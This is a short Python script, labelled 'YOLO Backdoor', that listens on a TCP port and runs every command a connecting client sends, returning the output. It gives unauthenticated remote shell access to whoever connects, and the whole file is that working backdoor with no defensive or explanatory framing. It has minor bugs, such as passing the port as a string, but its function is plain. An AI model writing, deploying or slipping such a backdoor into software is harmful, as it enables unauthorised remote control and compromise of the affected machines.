import sys,socket,time,re,subprocess,os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
sock.bind(('1.1.1.5',sys.argv[1]))
sock.listen(5)
conn,addr = sock.accept()
conn.send('== YOLO Backdoor ==\n\n>')
while 1:         
    data = conn.recv(1024)
    cmd = data.strip().split(' ')
    if cmd[0] == 'cd':
        os.chdir(cmd[1])
    elif cmd[0] in ('exit'):
        break
    else:
        conn.send(subprocess.check_output(cmd)+'\n>') 
conn.close()
sock.shutdown(socket.SHUT_RDWR)
sock.close()